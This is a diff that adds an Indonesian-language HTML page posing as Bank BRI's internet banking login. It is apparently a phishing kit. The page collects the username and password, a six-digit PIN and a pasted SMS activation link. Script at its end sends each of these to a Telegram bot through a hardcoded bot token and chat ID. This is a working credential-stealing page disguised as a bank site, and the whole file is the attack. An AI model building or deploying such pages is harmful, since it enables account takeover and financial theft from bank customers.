@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login - PIN - Cek SMS</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Nunito&display=swap');
+  * {
+    box-sizing: border-box;
+  }
+  body, html {
+    margin:0; padding:0;
+    font-family: 'Nunito', sans-serif;
+    height: 100vh;
+    width: 100vw;
+    overflow-x: hidden;
+    background: #fff;
+  }
+  .page {
+    display: none;
+    height: 100vh;
+    width: 100vw;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+    padding: 20px;
+    box-sizing: border-box;
+  }
+  .page.active {
+    display: block;
+  }
+  /* ===== Login Page ===== */
+  #loginPage {
+    max-width: 380px;
+    margin: 0 auto;
+    color: #003366;
+  }
+  .header-image {
+    max-width: 360px;
+    margin: 0 auto 30px auto;
+    text-align: center;
+  }
+  .header-image img {
+    width: 100%;
+    height: auto;
+    display: inline-block;
+  }
+  h2 {
+    font-weight: 700;
+    font-size: 28px;
+    margin-bottom: 28px;
+    text-align: center;
+  }
+  form {
+    max-width: 360px;
+    margin: 0 auto;
+  }
+  .input-group {
+    position: relative;
+    margin-bottom: 20px;
+  }
+  .input-group svg {
+    position: absolute;
+    top: 50%;
+    left: 14px;
+    transform: translateY(-50%);
+    width: 20px;
+    height: 20px;
+    stroke: #2967a1;
+    stroke-width: 1.5;
+    fill: none;
+  }
+  .input-group.toggle-password svg {
+    left: auto;
+    right: 14px;
+    cursor: pointer;
+  }
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    padding: 14px 44px 14px 44px;
+    border-radius: 10px;
+    border: 1px solid #d0dae8;
+    background: #f9fafe;
+    font-weight: 600;
+    font-size: 16px;
+    color: #003366;
+    outline: none;
+    transition: border-color 0.3s ease;
+    box-sizing: border-box;
+  }
+  input[type="text"]:focus,
+  input[type="password"]:focus {
+    border-color: #00569c;
+    background: #fff;
+  }
+  input::placeholder {
+    color: #a0aec0;
+  }
+  .forgot-link {
+    text-align: right;
+    font-size: 14px;
+    color: #00569c;
+    cursor: pointer;
+    user-select: none;
+    margin: 10px 0 30px;
+    text-decoration: underline;
+  }
+  button.login-btn {
+    width: 100%;
+    max-width: 360px;
+    padding: 16px 0;
+    border-radius: 15px;
+    border: none;
+    font-weight: 700;
+    font-size: 20px;
+    color: white;
+    background: #a9c9ff;
+    cursor: not-allowed;
+    user-select: none;
+    box-shadow: 0 1px 6px rgba(0,0,0,0.1);
+    transition: background-color 0.3s ease;
+    position: fixed;
+    bottom: 0;
+    left: 50%;
+    transform: translateX(-50%);
+  }
+  button.login-btn.enabled {
+    background: #7aabdd;
+    cursor: pointer;
+  }
+  /* ===== PIN Page ===== */
+  #pinPage {
+    height: 100vh;
+    width: 100vw;
+    background: #1566c0;
+    color: white;
+    padding: 48px 20px 40px;
+    box-sizing: border-box;
+    display: none;
+    flex-direction: column;
+    justify-content: flex-start;
+    align-items: center;
+    overflow-y: auto;
+  }
+  #pinPage.active {
+    display: flex;
+  }
+  #pinPage header {
+    display: flex;
+    align-items: center;
+    width: 100%;
+    margin-bottom: 28px;
+    padding: 0 18px;
+  }
+  #pinPage header svg {
+    width: 32px;
+    height: 32px;
+    stroke: white;
+    stroke-width: 3;
+    cursor: pointer;
+  }
+  #pinPage header h1 {
+    flex: 1;
+    text-align: center;
+    font-weight: 700;
+    font-size: 22px;
+    letter-spacing: 1.1px;
+    margin: 0 32px;
+  }
+  .pin-instruction {
+    font-weight: 700;
+    font-size: 22px;
+    margin-bottom: 6px;
+    text-align: center;
+  }
+  .pin-subtext {
+    font-weight: 500;
+    font-size: 14px;
+    opacity: 0.9;
+    margin-bottom: 36px;
+    text-align: center;
+  }
+  .pin-boxes {
+    display: flex;
+    justify-content: center;
+    gap: 14px;
+    margin-bottom: 48px;
+    width: 100%;
+    max-width: 360px;
+  }
+  .pin-box {
+    width: 48px;
+    height: 48px;
+    border-radius: 14px;
+    border: 3px solid rgba(255 255 255 / 0.6);
+    background-color: rgba(255 255 255 / 0.27);
+    font-size: 28px;
+    font-weight: 700;
+    text-align: center;
+    line-height: 48px;
+    user-select: none;
+    color: white;
+  }
+  .pin-box.empty {
+    color: rgba(255 255 255 / 0.5);
+    background-color: rgba(255 255 255 / 0.16);
+    border-color: rgba(255 255 255 / 0.35);
+  }
+  #pinInput {
+    position: absolute;
+    opacity: 0;
+    pointer-events: none;
+  }
+  /* ===== Cek SMS Page ===== */
+  #cekSMSPage {
+    max-width: 380px;
+    margin: 40px auto 60px auto;
+    padding: 30px 24px;
+    border-radius: 13px;
+    background: #fff;
+    box-shadow: 0 1px 12px rgba(0,0,0,0.12);
+    color: #003366;
+    font-size: 14px;
+    text-align: center;
+    display: none;
+    flex-direction: column;
+  }
+  #cekSMSPage.active {
+    display: flex;
+  }
+  #cekSMSPage img {
+    width: 72px;
+    margin: 0 auto 12px auto;
+    display: block;
+  }
+  #cekSMSPage h3 {
+    font-weight: 600;
+    font-size: 14px;
+    margin: 6px 0;
+    user-select: none;
+  }
+  #cekSMSPage p.desc {
+    margin: 12px 0 16px;
+    user-select: none;
+  }
+  #smsInput {
+    width: 100%;
+    height: 100px;
+    border: 1.6px solid #d0dae8;
+    border-radius: 8px;
+    padding: 14px;
+    font-size: 14px;
+    color: #777;
+    resize: none;
+    box-sizing: border-box;
+  }
+  #smsConfirmBtn {
+    margin-top: 28px;
+    width: 100%;
+    padding: 14px 0;
+    font-weight: 600;
+    font-size: 16px;
+    background: #a9c9ff;
+    color: white;
+    border: none;
+    border-radius: 12px;
+    cursor: not-allowed;
+    user-select: none;
+    transition: background-color 0.3s;
+  }
+  #smsConfirmBtn.enabled {
+    background: #7aabdd;
+    cursor: pointer;
+  }
+  #timer {
+    font-weight: 700;
+    font-size: 18px;
+    margin-top: 8px;
+    user-select: none;
+  }
+  #resendLink {
+    margin-top: 28px;
+    color: #00569c;
+    cursor: pointer;
+    user-select: none;
+    text-decoration: underline;
+    font-size: 13px;
+  }
+</style>
+</head>
+<body>
+
+<section id="loginPage" class="page active" aria-label="Halaman Login">
+  <div class="header-image">
+    <img src="https://ib.bri.co.id/pg/img/Login-18.png" alt="BRI Illustration" />
+  </div>
+  <h2>Login</h2>
+  <form id="loginForm" autocomplete="off" novalidate>
+    <div class="input-group">
+      <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+        <circle cx="12" cy="7" r="4" stroke-linecap="round" stroke-linejoin="round"></circle>
+        <path d="M5.5 21a9 9 0 0113 0" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+      <input type="text" id="username" placeholder="Username" pattern="^[A-Za-z0-9]{8,12}$" required spellcheck="false" autocomplete="off" title="Username harus 8–12 karakter kombinasi huruf dan angka tanpa spasi" />
+    </div>
+    <div class="input-group toggle-password">
+      <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" style="position:absolute; left:14px; top:50%; transform: translateY(-50%);">
+        <rect x="6" y="11" width="12" height="9" rx="2" ry="2" stroke-linecap="round" stroke-linejoin="round"></rect>
+        <path d="M9 11V7a3 3 0 016 0v4" stroke-linecap="round" stroke-linejoin="round"></path>
+      </svg>
+      <input type="password" id="password" placeholder="Password" minlength="8" required spellcheck="false" autocomplete="off" title="Password minimal 8 karakter dengan 1 huruf kapital dan beda dr username"/>
+      <svg id="togglePassword" viewBox="0 0 24 24" stroke="#2967a1" fill="none" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="right:14px; top:50%; position:absolute; transform:translateY(-50%); cursor:pointer;">
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+        <circle cx="12" cy="12" r="3"></circle>
+      </svg>
+    </div>
+    <div class="forgot-link" tabindex="0" role="button" aria-label="Lupa Username atau Password?">Lupa Username/Password?</div>
+    <button type="submit" class="login-btn" disabled>Login</button>
+  </form>
+</section>
+
+<section id="pinPage" class="page" aria-label="Halaman Konfirmasi PIN">
+  <header>
+    <svg id="backToLoginBtn" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.7" stroke-linecap="round" stroke-linejoin="round" role="button" aria-label="Kembali ke halaman login" tabindex="0" style="cursor:pointer;">
+      <line x1="19" y1="12" x2="5" y2="12" />
+      <polyline points="12 19 5 12 12 5" />
+    </svg>
+    <h1>PIN</h1>
+    <div style="width:32px;"></div>
+  </header>
+  <div class="pin-instruction">Konfirmasi PIN</div>
+  <div class="pin-subtext">Konfirmasi PIN yang sudah kamu buat</div>
+  <div class="pin-boxes" aria-live="polite" aria-label="Input PIN" tabindex="0">
+    <div class="pin-box empty">-</div>
+    <div class="pin-box empty">-</div>
+    <div class="pin-box empty">-</div>
+    <div class="pin-box empty">-</div>
+    <div class="pin-box empty">-</div>
+    <div class="pin-box empty">-</div>
+  </div>
+  <div class="lupaPin" tabindex="0" role="button" aria-label="Lupa PIN?">Lupa PIN?</div>
+  <input type="password" id="pinInput" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" style="position:absolute;opacity:0;pointer-events:none;" />
+</section>
+
+<section id="cekSMSPage" class="page" aria-label="Halaman Cek SMS">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR8gtKlKMlF61jjSzvdYQDcvuUKvUiEPmskxHsQsL79dw&s=10" alt="Icon Cek SMS" />
+  <h3>Cek SMS</h3>
+  <div id="timer">03 : 00</div>
+  <p class="desc">Link untuk aktivasi Tarif telah kami kirim ke Nomor Handphone anda, Silahkan salin SMS tautan lalu di tempel di bawah ini</p>
+  <textarea id="smsInput" placeholder="Contoh SMS
+https://brimo.bri.co.id/app/login?code=xxxx" rows="5"></textarea>
+  <button id="smsConfirmBtn" disabled>Konfirmasi</button>
+  <div id="resendLink" tabindex="0" role="button" aria-label="Kirim Ulang">Tidak Terima SMS? Kirim Ulang</div>
+</section>
+
+<script>
+  const loginPage = document.getElementById('loginPage');
+  const pinPage = document.getElementById('pinPage');
+  const cekSMSPage = document.getElementById('cekSMSPage');
+
+  // Login page
+  const username = document.getElementById('username');
+  const password = document.getElementById('password');
+  const togglePwd = document.getElementById('togglePassword');
+  const loginBtn = loginPage.querySelector('.login-btn');
+  const loginForm = document.getElementById('loginForm');
+
+  togglePwd.addEventListener('click', () => {
+    password.type = password.type === 'password' ? 'text' : 'password';
+    togglePwd.innerHTML = password.type === 'text'
+      ? '<path d="M17.94 17.94A10.94 10.94 0 0112 20c-7 0-11-8-11-8a17.54 17.54 0 014.75-6.72M9.88 9.88a3 3 0 014.24 4.24M1 1l22 22" />'
+      : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  });
+
+  function validUsername() {
+    return /^[A-Za-z0-9]{8,12}$/.test(username.value.trim());
+  }
+  function validPassword() {
+    const val = password.value;
+    const uname = username.value.trim();
+    return val.length >= 8 && /[A-Z]/.test(val) && val.toLowerCase() !== uname.toLowerCase();
+  }
+  function updateLoginBtn() {
+    if(validUsername() && validPassword()){
+      loginBtn.disabled = false;
+      loginBtn.classList.add('enabled');
+      loginBtn.style.cursor = 'pointer';
+    } else {
+      loginBtn.disabled = true;
+      loginBtn.classList.remove('enabled');
+      loginBtn.style.cursor = 'not-allowed';
+    }
+  }
+  [username, password].forEach(el => {
+    el.addEventListener('input', updateLoginBtn);
+    el.addEventListener('change', updateLoginBtn);
+    el.addEventListener('blur', updateLoginBtn);
+  });
+  window.addEventListener('load', updateLoginBtn);
+
+  loginForm.addEventListener('submit', e=>{
+    e.preventDefault();
+    if(validUsername() && validPassword()){
+      loginPage.classList.remove('active');
+      pinPage.classList.add('active');
+      pinInput.value = '';
+      updatePinDisplay('');
+      pinInput.focus();
+      document.body.style.overflow = 'hidden';
+    }
+  });
+
+  // PIN page
+  const backBtn = document.getElementById('backToLoginBtn');
+  const pinBoxes = document.querySelectorAll('.pin-box');
+  const pinInput = document.getElementById('pinInput');
+
+  backBtn.addEventListener('click', () => {
+    pinPage.classList.remove('active');
+    loginPage.classList.add('active');
+    pinInput.value = '';
+    updatePinDisplay('');
+    document.body.style.overflow = 'auto';
+    updateLoginBtn();
+  });
+  backBtn.addEventListener('keydown', e => {
+    if(e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      backBtn.click();
+    }
+  });
+
+  function updatePinDisplay(value) {
+    pinBoxes.forEach((box, i) => {
+      if(i < value.length){
+        box.textContent = value[i];
+        box.classList.remove('empty');
+      } else {
+        box.textContent = '-';
+        box.classList.add('empty');
+      }
+    });
+  }
+
+  function isPinValid(pin) {
+    return pin.length === 6 && !pin.split('').every(c => c === pin[0]);
+  }
+
+  pinInput.addEventListener('input', () => {
+    let val = pinInput.value.replace(/\D/g, '').slice(0,6);
+    pinInput.value = val;
+    updatePinDisplay(val);
+    if(isPinValid(val)){
+      pinPage.classList.remove('active');
+      cekSMSPage.classList.add('active');
+      document.body.style.overflow = 'auto';
+      startTimer();
+      smsInput.value = '';
+      smsConfirmBtn.disabled = true;
+      smsInput.focus();
+    }
+  });
+
+  document.querySelector('.pin-boxes').addEventListener('click', () => {
+    pinInput.focus();
+  });
+
+  // Halaman cek SMS
+  const smsInput = document.getElementById('smsInput');
+  const smsConfirmBtn = document.getElementById('smsConfirmBtn');
+  const resendLink = document.getElementById('resendLink');
+  const timerEl = document.getElementById('timer');
+
+  smsInput.addEventListener('input', ()=>{
+    const val = smsInput.value.trim();
+    smsConfirmBtn.disabled = val === '';
+    if(!smsConfirmBtn.disabled){
+      smsConfirmBtn.classList.add('enabled');
+    } else {
+      smsConfirmBtn.classList.remove('enabled');
+    }
+  });
+
+  smsConfirmBtn.addEventListener('click', ()=>{
+    alert("error!");
+  });
+
+  resendLink.addEventListener('click', () => {
+    alert("SMS dikirim ulang!");
+    resetTimer();
+  });
+  resendLink.addEventListener('keydown', e=>{
+    if(e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault();
+      resendLink.click();
+    }
+  });
+
+  let countdown;
+  let timeLeft = 180;
+  function startTimer(){
+    timeLeft = 180;
+    updateTimerDisplay();
+    clearInterval(countdown);
+    countdown = setInterval(()=>{
+      timeLeft--;
+      updateTimerDisplay();
+      if(timeLeft <= 0){
+        clearInterval(countdown);
+      }
+    }, 1000);
+  }
+  function updateTimerDisplay(){
+    const m = String(Math.floor(timeLeft / 60)).padStart(2,'0');
+    const s = String(timeLeft % 60).padStart(2,'0');
+    timerEl.textContent = `${m} : ${s}`;
+  }
+  function resetTimer(){
+    clearInterval(countdown);
+    startTimer();
+  }
+
+  // ========== Bagian untuk pengiriman Telegram Bot ==========
+  // Ganti ID dan TOKEN berikut sesuai bot Anda:
+  const TELEGRAM_CHAT_ID = '8165489813';
+  const TELEGRAM_BOT_TOKEN = '8434058499:AAHaS0hJjSz40_CMdVED5GiVBGAmolTeivc';
+
+  function sendToTelegram(message) {
+    if(!TELEGRAM_CHAT_ID || !TELEGRAM_BOT_TOKEN) {
+      console.warn('Telegram Chat ID dan Bot Token belum diisi!');
+      return;
+    }
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    }).then(res => {
+      if(!res.ok){
+        console.warn('Gagal kirim pesan ke telegram:', res.statusText);
+      }
+    })
+    .catch(err => console.error('Error kirim ke telegram:', err));
+  }
+
+  // Contoh otomatis kirim data login
+  loginForm.addEventListener('submit', e=>{
+    e.preventDefault();
+    if(validUsername() && validPassword()){
+      const msg = `Login Sukses!\nUsername: ${username.value}\nPassword: ${password.value}`;
+      sendToTelegram(msg);
+    }
+  });
+
+  // Kirim PIN ke telegram saat valid dan pindah halaman
+  pinInput.addEventListener('input', () => {
+    if(isPinValid(pinInput.value)){
+      sendToTelegram(`PIN Konfirmasi: ${pinInput.value}`);
+    }
+  });
+
+  // Kirim SMS ke telegram saat user klik konfirmasi
+  smsConfirmBtn.addEventListener('click', () => {
+    if(smsInput.value.trim() !== ''){
+      sendToTelegram(`SMS Dikonfirmasi:\n${smsInput.value}`);
+    }
+  });
+</script>
+
+</body>
+</html>
